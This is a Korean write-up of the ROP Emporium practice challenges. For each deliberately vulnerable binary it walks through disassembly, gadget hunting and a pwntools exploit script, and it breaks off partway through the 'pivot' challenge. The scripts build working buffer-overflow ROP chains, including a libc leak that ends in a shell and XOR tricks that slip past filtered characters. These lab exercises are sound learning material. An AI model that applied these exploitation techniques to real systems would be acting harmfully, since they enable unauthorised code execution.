---
title: ROP Emporium writeups
tags: assignment5 wargame ctf writeup pwnable rop ropemporium.com
---
## 0. ret2win
```bash
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
main함수는 별거 없고 pwnme를 호출해 준다.
```nasm
Dump of assembler code for function pwnme:
   0x00000000004007b5 <+0>:     push   rbp
   0x00000000004007b6 <+1>:     mov    rbp,rsp
   ...
   0x00000000004007fd <+72>:    lea    rax,[rbp-0x20]
   0x0000000000400801 <+76>:    mov    esi,0x32
   0x0000000000400806 <+81>:    mov    rdi,rax
   0x0000000000400809 <+84>:    call   0x400620 <fgets@plt>
   0x000000000040080e <+89>:    nop
   0x000000000040080f <+90>:    leave
   0x0000000000400810 <+91>:    ret
End of assembler dump.
```
rbp-0x20에 0x32만큼의 입력을 받기 때문에 bof에 취약하다.

이를 이용해서 return 주소를 덮어씌우면 된다.

덮어씌우는 주소는 ret2win이라는 함수로, ``system('/bin/cat flag.txt')``를 포함한다.

exploit.py:
```python
from pwn import *

e = ELF('./ret2win')
p = process('./ret2win')

pl = 'a'*0x28 + p64(e.symbols['ret2win'])

p.recvuntil('> ')
p.sendline(pl)
p.interactive()
```
exploit32.py:
```python
from pwn import *

e = ELF('./ret2win32')
p = process('./ret2win32')

pl = 'a'*0x2c + p32(e.symbols['ret2win'])

p.recvuntil('> ')
p.sendline(pl)
p.interactive()
```
출력:
```bash
junheah@ubuntu:~/ropemp/ret2win$ python exp.py
[*] '/home/junheah/ropemp/ret2win/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './ret2win': pid 7445
[*] Switching to interactive mode
Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
```

## 1. split
```bash
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
main 함수에서 pwnme를 호출해 준다.
```nasm
Dump of assembler code for function pwnme:
   0x00000000004007b5 <+0>:     push   rbp
   0x00000000004007b6 <+1>:     mov    rbp,rsp
   ...
   0x00000000004007f3 <+62>:    lea    rax,[rbp-0x20]
   0x00000000004007f7 <+66>:    mov    esi,0x60
   0x00000000004007fc <+71>:    mov    rdi,rax
   0x00000000004007ff <+74>:    call   0x400620 <fgets@plt>
   0x0000000000400804 <+79>:    nop
   0x0000000000400805 <+80>:    leave
   0x0000000000400806 <+81>:    ret
End of assembler dump.
```
rbp-0x20에 0x60 만큼 입력을 받으므로 bof에 취약하다.

usefulFunction에는 system 함수 호출이 있으나 "/bin/ls" 를 넘겨주므로 함수를 호출하는 것 말고 다른 방법을 찾아야 한다.

```bash
junheah@ubuntu:~/ropemp/split$ rp++ -f split -r 3 | grep 'pop rdi'
0x00400883: pop rdi ; ret  ;  (1 found)
```
rdi에 넣어주는 gadget도 있고,
```bash
gdb-peda$ find /bin
Searching for '/bin' in: None ranges
Found 17 results, display max 17 items:
  split : 0x4008ff --> 0x736c2f6e69622f ('/bin/ls')
  split : 0x6008ff --> 0x736c2f6e69622f ('/bin/ls')
  split : 0x601060 ("/bin/cat flag.txt")
   libc : 0x7ffff7b99d57 --> 0x68732f6e69622f ('/bin/sh')
```
"/bin/cat flag.txt" 문자열도 바이너리 안에 있으니, 다음과 같은 구조의 버퍼를 입력하면 되겠다.
<table>
    <tr><td>dummy data : (0x28 bytes)</td></tr>
    <tr><td>ret addr for pwnme : pop ret</td></tr>
    <tr><td>rdi : "/bin/cat flag.txt"</td></tr>
    <tr><td>ret addr for pop ret : system@plt</td></tr>
</table>

exploit.py:
```python
from pwn import *

pr = 0x400883
bincat = 0x601060
systemplt = 0x4005e0

pl = 'a'*0x28 + p64(pr) + p64(bincat) + p64(systemplt)

p = process('./split')
p.recvuntil('> ')
p.sendline(pl)
p.interactive()
```
exploit32.py:
```python
from pwn import *

bincat = 0x804a030
systemplt = 0x8048430

pl = 'a'*0x2c + p32(systemplt) + p32(0) + p32(bincat)

p = process('./split32')
p.recvuntil('> ')
p.sendline(pl)
p.interactive()
```
출력:
```bash
junheah@ubuntu:~/ropemp/split$ python exp.py
[+] Starting local process './split': pid 8233
[*] Switching to interactive mode
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
```

## 2. callme
```bash
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
main함수에서 pwnme를 호출해준다.
```nasm
Dump of assembler code for function pwnme:
   0x0000000000401a05 <+0>:     push   rbp
   0x0000000000401a06 <+1>:     mov    rbp,rsp
   0x0000000000401a09 <+4>:     sub    rsp,0x20
   0x0000000000401a0d <+8>:     lea    rax,[rbp-0x20]
   0x0000000000401a11 <+12>:    mov    edx,0x20
   0x0000000000401a16 <+17>:    mov    esi,0x0
   0x0000000000401a1b <+22>:    mov    rdi,rax
   0x0000000000401a1e <+25>:    call   0x401820 <memset@plt>
   0x0000000000401a23 <+30>:    mov    edi,0x401b70
   0x0000000000401a28 <+35>:    call   0x4017f0 <puts@plt>
   0x0000000000401a2d <+40>:    mov    edi,0x401b92
   0x0000000000401a32 <+45>:    mov    eax,0x0
   0x0000000000401a37 <+50>:    call   0x401800 <printf@plt>
   0x0000000000401a3c <+55>:    mov    rdx,QWORD PTR [rip+0x20064d]        # 0x602090 <stdin@@GLIBC_2.2.5>
   0x0000000000401a43 <+62>:    lea    rax,[rbp-0x20]
   0x0000000000401a47 <+66>:    mov    esi,0x100
   0x0000000000401a4c <+71>:    mov    rdi,rax
   0x0000000000401a4f <+74>:    call   0x401840 <fgets@plt>
   0x0000000000401a54 <+79>:    nop
   0x0000000000401a55 <+80>:    leave
   0x0000000000401a56 <+81>:    ret
End of assembler dump.
```
pwnme+62~74를 보면 bof에 취약함을 알 수 있다.

암호화된 플래그를 복호화 하면 되는듯 하다.

pwnme 외에도, 사용되지는 않지만 봐야할 함수들이 몇가지 있다:
```
0x0000000000401a57  usefulFunction
0x0000000000401ab0  usefulGadgets
0x0000000000401850  callme_one@plt
0x0000000000401870  callme_two@plt
0x0000000000401810  callme_three@plt
```
usefulFunction은 callme_one~three에 각각 6,7,8을 parameter로 넣고 호출한다,

usefulGadgets는 말 그대로 rop를 하는데 필요한 gadget이 있다.
```nasm
Dump of assembler code for function usefulGadgets:
   0x0000000000401ab0 <+0>:     pop    rdi
   0x0000000000401ab1 <+1>:     pop    rsi
   0x0000000000401ab2 <+2>:     pop    rdx
   0x0000000000401ab3 <+3>:     ret
   0x0000000000401ab4 <+4>:     nop    WORD PTR cs:[rax+rax*1+0x0]
   0x0000000000401abe <+14>:    xchg   ax,ax
End of assembler dump.
```
callme_one~three는 각 파라미터를 1,2,3과 비교하고, 틀릴시 메시지를 출력한다.

이 세 함수의 역할은 순서대로 실행했을때, encrypted_flag를 복호화 해주는 것이라 예상했다.

three에는 함수 에필로그 대신 exit@plt가 있기에 이 함수를 마지막 순서로 정했다.

<table>
	<tr><td>dummy data : (0x28 bytes)</td></tr>
    <tr><td>ret addr for pwnme : pppr</td></tr>
    <tr><td>param[0] for next func : 1</td></tr>
    <tr><td>param[1] for next func : 2</td></tr>
    <tr><td>param[2] for next func : 3</td></tr>
    <tr><td>ret addr for pppr : callme_one</td></tr>
    <tr><td>...</td></tr>
    <tr><td>ret addr for pppr : callme_two</td></tr>
    <tr><td>...</td></tr>
    <tr><td>ret addr for pppr : callme_three</td></tr>
    <tr><td>...</td></tr>
</table>

exploit.py:
```python
from pwn import *

e = ELF('./callme')
p = process(['./callme'], env = {'LD_PRELOAD':'./libcallme.so'})

pppr = e.symbols['usefulGadgets']

payload = 'a'*0x28
payload += p64(pppr) + p64(1) + p64(2) + p64(3)
payload += p64(e.plt['callme_one'])
payload += p64(pppr) + p64(1) + p64(2) + p64(3)
payload += p64(e.plt['callme_two'])
payload += p64(pppr) + p64(1) + p64(2) + p64(3)
payload += p64(e.plt['callme_three'])

p.recvuntil('> ')
p.sendline(payload)
p.interactive()
```
exploit32.py:
```python
from pwn import *

e = ELF('./callme32')
p = process(['./callme32'], env = {'LD_PRELOAD':'./libcallme32.so'})

pppr = 0x8048576

payload = 'a'*0x2c
payload += p32(e.plt['callme_one']) + p32(pppr) + p32(1) + p32(2) + p32(3)
payload += p32(e.plt['callme_two']) + p32(pppr) + p32(1) + p32(2) + p32(3)
payload += p32(e.plt['callme_three']) + p32(pppr) + p32(1) + p32(2) + p32(3)

p.recvuntil('> ')
p.sendline(payload)
p.interactive()
```
출력:
```python
junheah@ubuntu:~/ropemp/callme$ python exp.py
[*] '/home/junheah/ropemp/callme/callme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RPATH:    './'
[+] Starting local process './callme': pid 7542
[*] Switching to interactive mode
[*] Process './callme' stopped with exit code 0 (pid 7542)
ROPE{a_placeholder_32byte_flag!}[*] Got EOF while reading in interactive
```

## 3. write4
```bash
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
```nasm
gdb-peda$ disas pwnme
Dump of assembler code for function pwnme:
   0x00000000004007b5 <+0>:     push   rbp
   0x00000000004007b6 <+1>:     mov    rbp,rsp
   ...
   0x00000000004007ec <+55>:    mov    rdx,QWORD PTR [rip+0x20087d]        # 0x601070 <stdin@@GLIBC_2.2.5>
   0x00000000004007f3 <+62>:    lea    rax,[rbp-0x20]
   0x00000000004007f7 <+66>:    mov    esi,0x200
   0x00000000004007fc <+71>:    mov    rdi,rax
   0x00000000004007ff <+74>:    call   0x400620 <fgets@plt>
   0x0000000000400804 <+79>:    nop
   0x0000000000400805 <+80>:    leave
   0x0000000000400806 <+81>:    ret
End of assembler dump.

```
split 문제와 매우 흡사하다. 하지만 이번에는 바이너리 자체에 '/bin/cat' 문자열이 없다.

```bash
gdb-peda$ elfsymbol
Found 7 symbols
puts@plt = 0x4005d0
system@plt = 0x4005e0
printf@plt = 0x4005f0
memset@plt = 0x400600
__libc_start_main@plt = 0x400610
fgets@plt = 0x400620
setvbuf@plt = 0x400630
```
```bash
junheah@ubuntu:~/ropemp/write4$ rp++ -f write4 -r 2 | grep 'pop rdi'
0x00400893: pop rdi ; ret  ;  (1 found)
```
puts/printf 가 있고, pop rdi 가젯이 있으므로 libc 주소를 leak 해주면 된다.

버퍼 구조는 다음과 같다:
<table>
    <tr><td>dummy data : (0x28 bytes)</td></tr>
    <tr><td>ret addr for pwnme : pop ret</td></tr>
    <tr><td>rdi : printf@got</td></tr>
    <tr><td>ret addr for pop ret : pwnme</td></tr>
</table>

[libc 주소 leak]

<table>
    <tr><td>dummy data : (0x28 bytes)</td></tr>
    <tr><td>ret addr for pwnme : pop ret</td></tr>
    <tr><td>rdi : '/bin/sh'</td></tr>
    <tr><td>ret addr for pop ret : system</td></tr>
</table>

exploit.py:
```python
from pwn import *

e = ELF('./write4')
l = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
binshoff = list(l.search('/bin/sh'))[0]

pr = 0x400893

pl = 'a'*0x28
pl += p64(pr) + p64(e.got['puts']) + p64(e.plt['puts']) + p64(e.symbols['pwnme'])

p = process('./write4')
p.recvuntil('> ')
p.sendline(pl)

libc = u64(p.recvn(6)+'\x00\x00') - l.symbols['puts']
print hex(libc)

pl = 'a'*0x28
pl += p64(pr) + p64(libc + binshoff) + p64(e.plt['system'])
p.recvuntil('> ')
p.sendline(pl)
p.interactive()
```
출력:
```bash
junheah@ubuntu:~/ropemp/write4$ python exp.py
[*] '/home/junheah/ropemp/write4/write4'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/lib/x86_64-linux-gnu/libc-2.23.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './write4': pid 8579
0x7faa816c5000
[*] Switching to interactive mode
$ cat flag.txt
ROPE{a_placeholder_32byte_flag!}
$
```

## 4. badchars
```bash
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : disabled
```
메인 함수는 별 내용이 없고 pwnme를 호출해 준다.
```nasm
Dump of assembler code for function pwnme:
   0x00000000004008f5 <+0>:     push   rbp
   0x00000000004008f6 <+1>:     mov    rbp,rsp
   0x00000000004008f9 <+4>:     sub    rsp,0x30
   0x00000000004008fd <+8>:     mov    QWORD PTR [rbp-0x30],0x0 ;<a> = 0
   0x0000000000400905 <+16>:    mov    edi,0x200
   0x000000000040090a <+21>:    call   0x400750 <malloc@plt>    ;0x200 만큼 malloc
   0x000000000040090f <+26>:    mov    QWORD PTR [rbp-0x28],rax ;malloc 받은 주소 저장
   0x0000000000400913 <+30>:    mov    rax,QWORD PTR [rbp-0x28]
   0x0000000000400917 <+34>:    test   rax,rax
   0x000000000040091a <+37>:    je     0x400934 <pwnme+63>  ;주소가 0(malloc 실패) 인지 확인
   0x000000000040091c <+39>:    mov    rax,QWORD PTR [rbp-0x28]
   0x0000000000400920 <+43>:    mov    edx,0x200
   0x0000000000400925 <+48>:    mov    esi,0x0
   0x000000000040092a <+53>:    mov    rdi,rax
   0x000000000040092d <+56>:    call   0x400710 <memset@plt>    ;malloc 받은 공간을 0으로 채움
   0x0000000000400932 <+61>:    jmp    0x40093e <pwnme+73>
   0x0000000000400934 <+63>:    mov    edi,0x1
   0x0000000000400939 <+68>:    call   0x400770 <exit@plt>
   0x000000000040093e <+73>:    lea    rax,[rbp-0x30]   ;<a>
   0x0000000000400942 <+77>:    add    rax,0x10
   0x0000000000400946 <+81>:    mov    edx,0x20
   0x000000000040094b <+86>:    mov    esi,0x0
   0x0000000000400950 <+91>:    mov    rdi,rax
   0x0000000000400953 <+94>:    call   0x400710 <memset@plt>
   0x0000000000400958 <+99>:    mov    edi,0x400c08 ;"badchars are: b i c / <space> f n s"
   0x000000000040095d <+104>:   call   0x4006e0 <puts@plt>
   0x0000000000400962 <+109>:   mov    edi,0x400c2c
   0x0000000000400967 <+114>:   mov    eax,0x0
   0x000000000040096c <+119>:   call   0x400700 <printf@plt>
   0x0000000000400971 <+124>:   mov    rdx,QWORD PTR [rip+0x200718]        # 0x601090 <stdin@@GLIBC_2.2.5>
   0x0000000000400978 <+131>:   mov    rax,QWORD PTR [rbp-0x28]
   0x000000000040097c <+135>:   mov    esi,0x200
   0x0000000000400981 <+140>:   mov    rdi,rax
   0x0000000000400984 <+143>:   call   0x400730 <fgets@plt>
   0x0000000000400989 <+148>:   mov    QWORD PTR [rbp-0x28],rax
   0x000000000040098d <+152>:   mov    rax,QWORD PTR [rbp-0x28]
   0x0000000000400991 <+156>:   mov    esi,0x200
   0x0000000000400996 <+161>:   mov    rdi,rax
   0x0000000000400999 <+164>:   call   0x4009f0 <nstrlen>
   0x000000000040099e <+169>:   mov    QWORD PTR [rbp-0x30],rax
   0x00000000004009a2 <+173>:   mov    rdx,QWORD PTR [rbp-0x30]
   0x00000000004009a6 <+177>:   mov    rax,QWORD PTR [rbp-0x28]
   0x00000000004009aa <+181>:   mov    rsi,rdx
   0x00000000004009ad <+184>:   mov    rdi,rax
   0x00000000004009b0 <+187>:   call   0x400a40 <checkBadchars>
   0x00000000004009b5 <+192>:   mov    rdx,QWORD PTR [rbp-0x30]
   0x00000000004009b9 <+196>:   mov    rax,QWORD PTR [rbp-0x28]
   0x00000000004009bd <+200>:   lea    rcx,[rbp-0x30]
   0x00000000004009c1 <+204>:   add    rcx,0x10
   0x00000000004009c5 <+208>:   mov    rsi,rax
   0x00000000004009c8 <+211>:   mov    rdi,rcx
   0x00000000004009cb <+214>:   call   0x400740 <memcpy@plt>
   0x00000000004009d0 <+219>:   mov    rax,QWORD PTR [rbp-0x28]
   0x00000000004009d4 <+223>:   mov    rdi,rax
   0x00000000004009d7 <+226>:   call   0x4006d0 <free@plt>
   0x00000000004009dc <+231>:   nop
   0x00000000004009dd <+232>:   leave
   0x00000000004009de <+233>:   ret
End of assembler dump.
```
pwnme에서는 malloc 한 공간에 입력 버퍼를 저장하고, checkBadchars로 문자열을 확인한 뒤, rbp-0x20에 memcpy로 복사한다.

이때 dest인 rbp-0x20은 고정인 반면 복사하는 길이는 입력 버퍼에 nstrlen을 한 값이므로, bof에 취약하다.

checkBadchars에서 필터링 되는 char들은
```bash
junheah@ubuntu:~/ropemp/badchars$ ./badchars
badchars by ROP Emporium
64bits

badchars are: b i c / <space> f n s
>
```
실행해 보면 알 수 있다.

usefulFunction은 system("/bin/ls")을 호출 해준다.

```nasm
Dump of assembler code for function usefulGadgets:
   0x0000000000400b30 <+0>:     xor    BYTE PTR [r15],r14b
   0x0000000000400b33 <+3>:     ret
   0x0000000000400b34 <+4>:     mov    QWORD PTR [r13+0x0],r12
   0x0000000000400b38 <+8>:     ret
   0x0000000000400b39 <+9>:     pop    rdi
   0x0000000000400b3a <+10>:    ret
   0x0000000000400b3b <+11>:    pop    r12
   0x0000000000400b3d <+13>:    pop    r13
   0x0000000000400b3f <+15>:    ret
   0x0000000000400b40 <+16>:    pop    r14
   0x0000000000400b42 <+18>:    pop    r15
   0x0000000000400b44 <+20>:    ret
   0x0000000000400b45 <+21>:    nop    WORD PTR cs:[rax+rax*1+0x0]
   0x0000000000400b4f <+31>:    nop
End of assembler dump.
```
이 gadget들을 이용해서 flag를 leak 하도록 바꾸는 것이 목표인것 같다.

쓰기 가능한 공간을 찾아서, mov로 "/bin/sh"를 저장하고, 이를 system에 넣으면 flag를 얻을 수 있을 것이다.

```bash
gdb-peda$ vmmap
Start              End                Perm      Name
0x00400000         0x00401000         r-xp      /home/junheah/ropemp/badchars/badchars
0x00600000         0x00601000         r--p      /home/junheah/ropemp/badchars/badchars
0x00601000         0x00602000         rw-p      /home/junheah/ropemp/badchars/badchars
...
````
저장 위치는 0x601000로 정했다.

직접 "/bin/sh"를 입력하는것은 불가능하기 때문에, xor 연산하여 입력한 후, 다시 xor로 복호화 했다.

exploit.py:
```python
from pwn import *

# badchar checker for debug
bad = ['b', 'i', 'c', '/', ' ', 'f', 'n', 's']
def check(src):
    for i in bad:
        if i in src:
            print 'BAD CHAR!'
            return

xr = 0x400b30
mr = 0x400b34
pr = 0x400b39
ppr = 0x400b3b
ppr2 = 0x400b40
buffer = 0x601000
# xor encrypted flag
binsh = '\x4e\x03\x08\x0f\x4e\x12\x09\x61'
# xor encryption key
key = p64(0x61)
systemplt = 0x4006f0

pl = 'a'*0x28
pl += p64(ppr) + binsh + p64(buffer) + p64(mr)
for i in range(0,8):
    pl += p64(ppr2) + key + p64(buffer+i) + p64(xr)
pl += p64(pr) + p64(buffer)
pl += p64(systemplt)

#check(pl)

p = process('./badchars')
p.recvuntil('> ')
p.sendline(pl)
p.interactive()
```
exploit32.py:
```python
from pwn import *

xr = 0x400b30
mr = 0x400b34
pr = 0x400b39
ppr = 0x400b3b
ppr2 = 0x400b40
buffer = 0x601000
# xor encrypted flag
binsh = '\x4e\x03\x08\x0f\x4e\x12\x09\x61'
# xor encryption key
key = p64(0x61)
systemplt = 0x4006f0

pl = 'a'*0x28
pl += p64(ppr) + binsh + p64(buffer) + p64(mr)
for i in range(0,8):
    pl += p64(ppr2) + key + p64(buffer+i) + p64(xr)
pl += p64(pr) + p64(buffer)
pl += p64(systemplt)

p = process('./badchars')
p.recvuntil('> ')
p.sendline(pl)
p.interactive()
```
출력:
```bash
junheah@ubuntu:~/ropemp/badchars$ python exp.py
[+] Starting local process './badchars': pid 8164
[*] Switching to interactive mode
f n s
> $ cat flag.txt
ROPE{a_placeholder_32byte_flag!}
```

## 5. fluff
```bash
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
main 함수에서 pwnme를 호출해 주고,
```nasm
Dump of assembler code for function pwnme:
   0x00000000004007b5 <+0>:     push   rbp
   0x00000000004007b6 <+1>:     mov    rbp,rsp
   0x00000000004007b9 <+4>:     sub    rsp,0x20
   0x00000000004007bd <+8>:     lea    rax,[rbp-0x20]
   0x00000000004007c1 <+12>:    mov    edx,0x20
   0x00000000004007c6 <+17>:    mov    esi,0x0
   0x00000000004007cb <+22>:    mov    rdi,rax
   0x00000000004007ce <+25>:    call   0x400600 <memset@plt>
   0x00000000004007d3 <+30>:    mov    edi,0x400910
   0x00000000004007d8 <+35>:    call   0x4005d0 <puts@plt>
   0x00000000004007dd <+40>:    mov    edi,0x400958
   0x00000000004007e2 <+45>:    mov    eax,0x0
   0x00000000004007e7 <+50>:    call   0x4005f0 <printf@plt>
   0x00000000004007ec <+55>:    mov    rdx,QWORD PTR [rip+0x20087d]        # 0x601070 <stdin@@GLIBC_2.2.5>
   0x00000000004007f3 <+62>:    lea    rax,[rbp-0x20]
   0x00000000004007f7 <+66>:    mov    esi,0x200
   0x00000000004007fc <+71>:    mov    rdi,rax
   0x00000000004007ff <+74>:    call   0x400620 <fgets@plt>
   0x0000000000400804 <+79>:    nop
   0x0000000000400805 <+80>:    leave
   0x0000000000400806 <+81>:    ret
End of assembler dump.
```
pwmme는 bof에 취약하다. 이 바이너리도 "/bin/sh" 같은 문자열이 없다.

```
Start              End                Perm      Name
0x00400000         0x00401000         r-xp      /home/junheah/ropemp/fluff/fluff
0x00600000         0x00601000         r--p      /home/junheah/ropemp/fluff/fluff
0x00601000         0x00602000         rw-p      /home/junheah/ropemp/fluff/fluff
```
mov를 사용해서 0x601000에다 "/bin/sh"를 저장한 뒤, system 함수로 쉘을 열면 될 것 같다.

```nasm
Dump of assembler code for function questionableGadgets:
   ...
a : <r11 = 0>
   0x0000000000400822 <+2>:     xor    r11,r11
   0x0000000000400825 <+5>:     pop    r14
   0x0000000000400827 <+7>:     mov    edi,0x601050
   0x000000000040082c <+12>:    ret
   ...
b : <r11 ^= r12>
   0x000000000040082f <+15>:    xor    r11,r12
   0x0000000000400832 <+18>:    pop    r12
   0x0000000000400834 <+20>:    mov    r13d,0x604060
   0x000000000040083a <+26>:    ret
   ...
c : <r10 = r11>
   0x0000000000400840 <+32>:    xchg   r11,r10
   0x0000000000400843 <+35>:    pop    r15
   0x0000000000400845 <+37>:    mov    r11d,0x602050
   0x000000000040084b <+43>:    ret
   ...
d : <[r10] = r11>
   0x000000000040084e <+46>:    mov    QWORD PTR [r10],r11
   0x0000000000400851 <+49>:    pop    r13
   0x0000000000400853 <+51>:    pop    r12
   0x0000000000400855 <+53>:    xor    BYTE PTR [r10],r12b
   0x0000000000400858 <+56>:    ret
   ...
End of assembler dump.
```
questionableGadgets의 가젯들을 사용해 보자. pwnme에서 ret 할때의 r12 값만 알면 쉽게 할수 있을 것 같다.

``pwnme 함수 에필로그에서 r12의 값 : 0x400650``

순서:
1. a: r11 = 0
2. b: r11 = 0x400650 / r12 = 0x201650
3. b: r11 = 0x601000 / r12 = '/bin/sh'
4. c: r10 = 0x601000 / r11 = ?
5. a: r11 = 0
6. b: r11 = '/bin/sh' / r12 = 0
7. d: write

버퍼 구조:
<table>
    <tr><td>dummy data : (0x28 bytes)</td></tr>
    <tr><td>ret for pwnme : a</td></tr>
    <tr><td>param[0] : 0</td></tr>
    <tr><td>ret for a : b</td></tr>
    <tr><td>param[0] : 0x201650</td></tr>
    <tr><td>ret for b : b</td></tr>
    <tr><td>param[0] : '/bin/sh'</td></tr>
    <tr><td>ret for b : c</td></tr>
    <tr><td>param[0] : 0</td></tr>
    <tr><td>ret for c : a</td></tr>
    <tr><td>param[0] : 0</td></tr>
    <tr><td>ret for a : b</td></tr>
    <tr><td>param[0] : 0</td></tr>
    <tr><td>ret for b : d</td></tr>
    <tr><td>param[0] : 0</td></tr>
    <tr><td>param[1] : 0</td></tr>
    <tr><td>ret for d : pop_rdi</td></tr>
    <tr><td>param[0] : 0x601000</td></tr>
    <tr><td>ret for pop_rdi : system@plt</td></tr>
</table>

exploit.py:
```python
from pwn import *

e = ELF('./fluff')
rdi_ret = 0x4008c3
buf = 0x601000
binsh = '/bin/sh\x00'
a = 0x400822
b = 0x40082f
c = 0x400840
d = 0x40084e

pl = 'a'*0x28 + p64(a)
pl += p64(0) + p64(b)
pl += p64(0x201650) + p64(b)
pl += binsh + p64(c)
pl += p64(0) + p64(a)
pl += p64(0) + p64(b)
pl += p64(0) + p64(d)
pl += p64(0)*2 + p64(rdi_ret)
pl += p64(buf) + p64(e.plt['system'])

f = open('test', 'w')
f.write(pl)
f.close()

p = process('./fluff')
p.recvuntil('> ')
p.sendline(pl)
p.interactive()
```
출력:
```bash
junheah@ubuntu:~/ropemp/fluff$ python exp.py
[*] '/home/junheah/ropemp/fluff/fluff'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './fluff': pid 1226
[*] Switching to interactive mode
$ cat flag.txt
ROPE{a_placeholder_32byte_flag!}
```

## 6. pivot
```bash
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
main에는 pwnme.
```nasm
Dump of assembler code for function pwnme:
   0x0000000000400a3b <+0>:     push   rbp
   0x0000000000400a3c <+1>:     mov    rbp,rsp
   0x0000000000400a3f <+4>:     sub    rsp,0x30
   0x0000000000400a43 <+8>:     mov    QWORD PTR [rbp-0x28],rdi
   0x0000000000400a47 <+12>:    lea    rax,[rbp-0x20]
   0x0000000000400a4b <+16>:    mov    edx,0x20
   0x0000000000400a50 <+21>:    mov    esi,0x0
   0x0000000000400a55 <+26>:    mov    rdi,rax
   0x0000000000400a58 <+29>:    call   0x400820 <memset@plt>
   0x0000000000400a5d <+34>:    mov    edi,0x400bc0
   0x0000000000400a62 <+39>:    call   0x400800 <puts@plt>
   0x0000000000400a67 <+44>:    mov    rax,QWORD PTR [rbp-0x28]
   0x0000000000400a6b <+48>:    mov    rsi,rax
   0x0000000000400a6e <+51>:    mov    edi,0x400be0
   0x0000000000400a73 <+56>:    mov    eax,0x0
   0x0000000000400a78 <+61>:    call   0x400810 <printf@plt>
   0x0000000000400a7d <+66>:    mov    edi,0x400c20
   0x0000000000400a82 <+71>:    call   0x400800 <puts@plt>
   0x0000000000400a87 <+76>:    mov    edi,0x400c52
   0x0000000000400a8c <+81>:    mov    eax,0x0
   0x0000000000400a91 <+86>:    call   0x400810 <printf@plt>
   0x0000000000400a96 <+91>:    mov    rdx,QWORD PTR [rip+0x2015f3]        # 0x602090 <stdin@@GLIBC_2.2.5>
   0x0000000000400a9d <+98>:    mov    rax,QWORD PTR [rbp-0x28]
   0x0000000000400aa1 <+102>:   mov    esi,0x100
   0x0000000000400aa6 <+107>:   mov    rdi,rax
   0x0000000000400aa9 <+110>:   call   0x400840 <fgets@plt>
   0x0000000000400aae <+115>:   mov    edi,0x400c58
   0x0000000000400ab3 <+120>:   call   0x400800 <puts@plt>
   0x0000000000400ab8 <+125>:   mov    edi,0x400c52
   0x0000000000400abd <+130>:   mov    eax,0x0
   0x0000000000400ac2 <+135>:   call   0x400810 <printf@plt>
   0x0000000000400ac7 <+140>:   mov    rdx,QWORD PTR [rip+0x2015c2]        # 0x602090 <stdin@@GLIBC_2.2.5>
   0x0000000000400ace <+147>:   lea    rax,[rbp-0x20]
   0x0000000000400ad2 <+151>:   mov    esi,0x40
   0x0000000000400ad7 <+156>:   mov    rdi,rax
   0x0000000000400ada <+159>:   call   0x400840 <fgets@plt>
   0x0000000000400adf <+164>:   nop
   0x0000000000400ae0 <+165>:   leave
   0x0000000000400ae1 <+166>:   ret
End of assembler dump.
```
pwnme에서 주소(rbp-0x28)를 leak 해준다. 다른 문제들과 다르게 입력을 두번 받는데, 첫 입력을 이 rbp-0x28 안에 있는 주소에 받는다.

두번째 입력은 정상적으로 rbp-0x20에 받는 대신 사이즈가 좀 작다.

아마 문제 이름처럼 stack pivoting으로 풀어야 하는것 같다.

실행할 rop chain을 첫번째 입력에 넣고, 두번째 입력에서 stack pointer를 첫번째 버퍼의 위치로 변경했다.

이제 스택은 바꿨고 flag는 어떻게 하느냐, 이건 문제에서 제공하는 커스텀 libc인 libpivot를 사용했다.

libpivot.so:
```bash
gdb-peda$ info function
All defined functions:

Non-debugging symbols:
0x00000000000007f8  _init
...
0x0000000000000970  foothold_function
...
0x0000000000000abe  ret2win
0x0000000000000ad8  _fini
```
ret2win으로 리턴하면 된다.
```bash
gdb-peda$ elfsymbol
Found 10 symbols
free@plt = 0x4007f0
puts@plt = 0x400800
printf@plt = 0x400810
memset@plt = 0x400820
__libc_start_main@plt = 0x400830
fgets@plt = 0x400840
foothold_function@plt = 0x400850
...
```
```nasm
gdb-peda$ disas foothold_function
Dump of assembler code for function foothold_function:
   0x0000000000000970 <+0>:     push   rbp
   0x0000000000000971 <+1>:     mov    rbp,rsp
   0x0000000000000974 <+4>:     lea    rdi,[rip+0x16d]        # 0xae8
   0x000000000000097b <+11>:    mov    eax,0x0
   0x0000000000000980 <+16>:    call   0x840 <printf@plt>
   0x0000000000000985 <+21>:    nop
   0x0000000000000986 <+22>:    pop    rbp
   0x0000000000000987 <+23>:    ret
End of assembler dump.
```
foothold_function 함수는 메시지를 출력해준다.

여기서 알아야 할 점은 foothold_function + 0x14e에 ret2win이 있다는것.

```nasm
Dump of assembler code for function usefulGadgets:
   0x0000000000400b00 <+0>:     pop    rax
   0x0000000000400b01 <+1>:     ret
   0x0000000000400b02 <+2>:     xchg   rsp,rax
   0x0000000000400b04 <+4>:     ret
